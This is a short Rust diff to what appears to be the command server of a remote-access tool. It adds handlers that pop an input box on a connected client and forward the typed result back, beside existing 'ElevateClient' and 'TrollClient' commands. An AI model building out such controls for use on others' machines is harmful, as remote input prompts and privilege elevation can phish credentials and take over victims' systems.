@@ -234,6 +234,20 @@ impl ServerWrapper {
                         .await
                 }
 
+                ShowInputBox(addr, data) => {
+                    self.handle_command(&addr, ClientboundPacket::ShowInputBox(data))
+                        .await;
+                }
+
+                InputBoxResult(addr, result) => {
+                    if let Some(_client) = self.connected_users.get(&addr) {
+                        self.emit_serde_payload("inputbox_result", serde_json::json!({
+                            "addr": addr.to_string(),
+                            "result": result
+                        })).await;
+                    }
+                }
+
                 ElevateClient(addr) => {
                     self.handle_command(&addr, ClientboundPacket::ElevateClient)
                         .await
@@ -555,10 +569,11 @@ impl ServerWrapper {
                 }
 
                 HandleTroll(addr, command) => {
-                    println!("Troll command received: {:?}", command);
                     self.handle_command(&addr, ClientboundPacket::TrollClient(command))
                         .await;
                 }
+
+
             }
         }
     }
